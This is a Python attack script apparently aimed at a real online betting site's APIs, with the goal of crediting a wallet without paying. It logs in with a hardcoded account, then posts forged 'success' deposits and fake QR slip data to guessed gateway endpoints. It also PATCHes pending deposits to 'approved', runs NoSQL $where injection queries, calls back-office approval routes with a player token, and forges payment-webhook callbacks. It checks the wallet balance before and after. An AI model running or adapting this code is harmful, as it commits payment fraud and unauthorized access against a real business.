#!/usr/bin/env python3
"""probe_genpay.py — Try GenPay / third-party gateway that may auto-credit.

   From F08: we88c uses GenPay for auto-credit deposits (no BO approval needed).
   Try: /mb/genpay-deposit, /mb/third-party-deposit, /mb/payment-gateway-deposit

   Also: try pbapi PATCH/PUT to update deposit status directly in MongoDB.
"""
import base64, json, pathlib, requests, time, uuid, sys

sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def fresh_auth():
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    return None

JWT = fresh_auth() or JWT_FILE.read_text().strip()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else r.json().get("balance","?")
    return f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. GenPay / third-party deposit endpoints ────────────────────────────────
print("=== 1. GenPay / third-party deposit endpoints ===")
now = datetime.now(timezone.utc) + timedelta(hours=7)
tx_ref = generate_tx_reference(now)
qr = generate_qr_data(tx_ref)
print(f"Fresh QR: {tx_ref}")

genpay_paths = [
    "/mb/genpay-deposit",
    "/mb/gen-pay-deposit",
    "/mb/third-party-deposit",
    "/mb/thirdparty-deposit",
    "/mb/payment-gateway-deposit",
    "/mb/gateway-deposit",
    "/mb/qr-deposit",
    "/mb/promptpay-deposit",
    "/mb/auto-deposit",
    "/mb/instant-deposit",
    "/mb/deposit/genpay",
    "/mb/deposit/callback",
    "/mb/deposit-callback",
]

for path in genpay_paths:
    payload = {
        "amount": 100,
        "deposit_amount": 100,
        "qr_string": qr,
        "tx_ref": tx_ref,
        "bank_code": "KBANK",
        "bank_no": "2373102108",
        "status": "success",
    }
    r = requests.post(f"{MGAPI}{path}", headers=HDR, json=payload, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:150]}")
    else:
        print(f"  POST {path}: {r.status_code}")
    time.sleep(0.2)

# ── 2. pbapi deposit collections — find pending and PATCH ────────────────────
print("\n=== 2. pbapi deposit collections ===")
pb_hdr = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}

# First: find our pending deposits
for collection in ["deposit-transactions", "auto-slip-deposits", "deposits",
                   "slip-deposits", "transactions", "wallet-transactions"]:
    r = requests.get(f"{PBAPI}/pb/{collection}",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$limit": 10, "$sort[createdAt]": -1},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  GET /pb/{collection}: HTTP {r.status_code}")
        if r.ok:
            try:
                data = r.json()
                items = data.get("data", []) if isinstance(data, dict) else data
                for item in items[:3]:
                    iid = item.get("id") or item.get("_id", "?")
                    status = item.get("status") or item.get("deposit_status", "?")
                    amt = item.get("amount") or item.get("deposit_amount", "?")
                    print(f"      {str(iid)[:12]} | status={status} | amount={amt}")
                    # Try PATCH to approve
                    if status not in ("approved", "success", "completed"):
                        pr = requests.patch(f"{PBAPI}/pb/{collection}/{iid}",
                                            headers=pb_hdr,
                                            json={"status": "approved"},
                                            timeout=10)
                        if pr.status_code not in (404, 405):
                            print(f"        PATCH: HTTP {pr.status_code}: {pr.text[:80]}")
            except Exception as e:
                print(f"      parse: {e}: {r.text[:100]}")
    time.sleep(0.2)

# ── 3. NoSQL injection to find/modify deposit records ────────────────────────
print("\n=== 3. NoSQL $where to find deposit records ===")
for q in [
    "this.player_id=='eea830ab-b187-4f21-9b79-28e2773b2f6b'",
    "this.username=='0972571110'",
    "this.phone=='0972571110'",
    "this.deposit_amount>0",
    "this.status=='pending'||this.status=='waiting'",
    "this.deposit_status=='waiting'",
]:
    r = requests.get(f"{PBAPI}/pb/latest-win",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$where": q, "$limit": 5},
                     timeout=10)
    if r.ok:
        try:
            items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
            if items:
                print(f"  [{q[:40]}] {len(items)} records")
                for item in items[:2]:
                    print(f"      id={str(item.get('id','?'))[:12]} | "
                          f"status={item.get('status')} | "
                          f"amount={item.get('amount', item.get('deposit_amount','?'))}")
        except Exception:
            pass

# ── 4. bgapi: try deposit approval endpoints with player JWT ─────────────────
print("\n=== 4. bgapi deposit approval with player JWT ===")
for path, payload in [
    ("/bo/deposit-transaction/approve", {"domain": DOMAIN, "status": "approved"}),
    ("/bo/slip-deposit-assign-task/approve", {"domain": DOMAIN, "status": "approved"}),
    ("/bo/auto-deposit-assign-task/approve", {"domain": DOMAIN, "status": "approved"}),
    ("/bo/deposit/confirm", {"domain": DOMAIN, "status": "approved"}),
]:
    r = requests.post(f"{BGAPI}{path}",
                      headers={"Authorization": f"Bearer {JWT}", "template": "vn",
                               "languagecode": "en", "correlationid": str(uuid.uuid4()),
                               "Content-Type": "application/json"},
                      json=payload, timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:150]}")
    else:
        print(f"  POST {path}: 404")
    time.sleep(0.2)

# ── 5. Check if any 3rd party gateways have webhook callback ─────────────────
print("\n=== 5. Gateway webhook callback simulation ===")
# Simulate a payment gateway callback that might auto-credit
callbacks = [
    ("/webhook/payment/success", {"order_id": tx_ref, "amount": 100, "status": "success"}),
    ("/webhook/deposit/success", {"tx_ref": tx_ref, "amount": 100, "status": "completed"}),
    ("/callback/genpay", {"transaction_id": tx_ref, "amount": 100, "status": "approved"}),
    ("/callback/payment", {"ref": tx_ref, "amount": 100, "result": "success"}),
]

for path, payload in callbacks:
    # Try on mgapi
    r = requests.post(f"{MGAPI}{path}",
                      headers={"Content-Type": "application/json"},
                      json=payload, timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] POST mgapi{path}: HTTP {r.status_code}: {r.text[:100]}")
    # Try on bgapi
    r2 = requests.post(f"{BGAPI}{path}",
                       headers={"Content-Type": "application/json"},
                       json=payload, timeout=10)
    if r2.status_code not in (404,):
        print(f"  [!!!] POST bgapi{path}: HTTP {r2.status_code}: {r2.text[:100]}")
    time.sleep(0.2)

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
